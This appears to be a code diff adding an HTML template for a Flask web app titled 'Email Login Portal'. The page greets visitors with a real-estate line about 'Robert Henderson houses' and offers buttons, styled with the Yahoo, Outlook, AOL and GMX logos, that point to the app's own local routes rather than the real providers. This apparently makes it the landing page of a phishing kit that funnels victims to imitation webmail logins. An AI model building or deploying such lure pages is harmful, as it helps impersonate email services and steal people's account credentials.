@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Email Login Portal</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/home.css') }}">
+</head>
+<body>
+    <!-- Transparent Navbar -->
+    <nav class="navbar">
+        <ul>
+            <li><a href="#home">Home</a></li>
+            <li><a href="#about">About</a></li>
+            <li><a href="#contact">Contact</a></li>
+        </ul>
+    </nav>
+
+    <header>
+       
+    </header>
+
+    <!-- Welcome Title Section -->
+    <section class="welcome-title">
+        <h1>Welcome to Robert Henderson houses, we currently in the market </h1>
+        
+    </section>
+
+    <div class="button-container">
+        <!-- Buttons with logos and links -->
+        <a href="{{ url_for('yahoo') }}" class="email-btn yahoo-btn">
+            <img src="{{ url_for('static', filename='image/yahoo.png') }}" alt="Yahoo Logo" class="logo-img">
+            <span>Go to Yahoo Mail</span>
+        </a>
+        <a href="{{ url_for('ms') }}" class="email-btn outlook-btn">
+            <img src="{{ url_for('static', filename='image/outlook.png') }}" alt="Outlook Logo" class="logo-img">
+            <span>Go to Outlook Mail</span>
+        </a>
+        <a href="{{ url_for('aol') }}" class="email-btn aol-btn">
+            <img src="{{ url_for('static', filename='image/aol.png') }}" alt="AOL Logo" class="logo-img">
+            <span>Go to AOL Mail</span>
+        </a>
+        <a href="{{ url_for('gmx') }}" class="email-btn gmx-btn">
+            <img src="{{ url_for('static', filename='image/gmx.png') }}" alt="GMX Logo" class="logo-img">
+            <span>Go to GMX Mail</span>
+        </a>
+    </div>
+
+    <script src="{{ url_for('static', filename='js/script.js') }}"></script>
+</body>
+</html>
